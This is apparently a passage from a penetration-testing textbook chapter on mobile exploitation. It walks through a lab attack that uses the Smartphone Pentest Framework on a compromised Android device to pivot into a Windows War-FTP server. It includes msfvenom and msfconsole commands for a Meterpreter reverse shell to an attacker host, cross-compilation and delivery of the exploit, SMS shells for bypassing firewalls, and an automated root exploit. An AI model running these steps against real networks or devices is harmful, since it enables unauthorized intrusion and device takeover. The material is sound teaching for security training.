### Host Status and Port Scanning
- **Host Status**: The target host is active, with a latency of 0.0068 seconds.
- **Port Scanning**: 992 ports were closed. The following port is open:
  - **21/tcp**: FTP

### Nmap Scan Summary
- **Scan Time**: Sun Sep 6 23:41:33 2015
- **IP Address**: 1 IP address (1 host up)
- **Scan Duration**: 3.43 seconds

### Exploiting a System on the Local Network
To complete the penetration test, we will use the Smartphone Pentest Framework (SPF) agent to run an exploit rather than using the entire mobile device as a pivot.

#### Prerequisites
- **Scripting Languages**: Android devices do not natively support scripting languages like Python or Perl. Therefore, we need C code for the exploit.
- **Exploit Code**: A simple C version of the exploit for War-FTP 1.65 is located at `/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c`.
- **Shellcode**: The included shellcode runs a `windows/meterpreter/reverse_tcp` payload and sends it back to `192.168.20.9` on port `4444`. If your Kali system is at a different IP address, regenerate the shellcode using Msfvenom:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\x00\x0a\x0d\x40'
  ```

#### Compiling the Exploit
1. **Cross Compilation**:
   - **GCC**: Using GCC will compile the exploit for Kali, but the ARM processor on the Android device won't recognize it.
   - **ARM Cross Compiler**: SPF includes an ARM cross compiler. Use the SPF menu to compile the C code for ARM Android:
     ```bash
     spf> 9
     Compile code to run on mobile devices
     1.) Compile C code for ARM Android
     spf> 1
     File to Compile: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c
     Output File: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
     ```

2. **Downloading the Exploit**:
   - **Agent Commands Menu**: Choose option 6 to download the file to the infected Android device.
     ```bash
     spf> 6
     File to download: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
     Delivery Method(SMS or HTTP): HTTP
     ```

3. **Setting Up the Handler**:
   - **Msfconsole**: Open Msfconsole on Kali and set up the multi/handler module with the appropriate payload.
     ```bash
     msf > use multi/handler
     msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
     msf exploit(handler) > set LHOST 192.168.20.9
     msf exploit(handler) > exploit
     ```

4. **Running the Exploit**:
   - **Agent Commands Menu**: Choose option 7 to execute the command.
     ```bash
     spf> 7
     Command: warftpmeterpreter 192.168.20.10 21
     Downloaded?: yes
     Delivery Method(SMS or HTTP): HTTP
     ```

### Bypassing Perimeter Controls
- **TCP Listener**: Use command option 10 to set up a listener to catch the shell on the infected mobile device.
- **SMS-Based Shell**: This method can bypass firewalls and proxies, allowing the shell to be sent directly to SPF via SMS.

### Privilege Escalation
- **Android Vulnerabilities**: Android shares some privilege escalation vulnerabilities with Linux and has its own security issues.
- **Privilege Escalation Exploit**:
  - **Agent Commands Menu**: Choose option 5 to attempt a privilege escalation.
    ```bash
    spf> 5
    1.) Choose a Root Exploit
    2.) Let SPF AutoSelect
    spf> 2
    Chosen Exploit: rageagainstthecage
    Delivery Method(SMS or HTTP): HTTP
    ```
  - **Verification**: After running the exploit, check the "Rooted" field in the main menu to confirm success.

### Summary
In this chapter, we explored the rapidly evolving world of mobile exploitation using the SPF tool. We covered various attacks on emulated Android devices, including remote attacks, client-side attacks, and malicious applications. We also used the SPF agent to escalate privileges and pivot to attack other devices on the network.

### Resources
- **Penetration Testing Primer**: NIST Technical Guide, PTES
- **Kali Linux**: Command Line Kung Fu, Introduction to the Command Line
- **Programming**: Discovery, Stack Overflow, Violent Python
- **Metasploit Framework**: Metasploit: The Penetration Tester’s Guide, Metasploit blog, Metasploit Unleashed
- **Information Gathering**: Google Hacking Database, Nmap Network Scanning
- **Finding Vulnerabilities**: National Vulnerability Database, Tenable blog
- **Capturing Traffic**: Counter Hack Reloaded, Ettercap, SSLStrip
- **Exploitation**: Exploit Database, Packet Storm, SecurityFocus, VulnHub
- **Password Attacks**: CloudCracker, John the Ripper, RainbowCrack Project
- **Social Engineering**: Social-Engineer, TrustedSec
- **Bypassing Antivirus**: Pentest Geek, Veil-Evasion
- **Post Exploitation**: Chris Gates’s blog, Carlos Perez’s blog, Obscuresec blog, Pwn Wiki, Rob Fuller’s blog
- **Web Application Testing**: Damn Vulnerable Web App, OWASP
- **Wireless Attacks**: Aircrack Wireless Tutorials, BackTrack 5 Wireless Penetration Testing Beginner’s Guide
- **Exploit Development**: Corelan Team Tutorials, FuzzySecurity, Hacking: The Art of Exploitation
- **Smartphone Pentest Framework**: Damn Vulnerable iPhone App, Drozer, OWASP mobile

### Courses
- **Strategic Security**
- **Offensive Security**
- **Exploit Development Bootcamp**
- **Sam Bowne**
- **SecurityTube PentesterAcademy**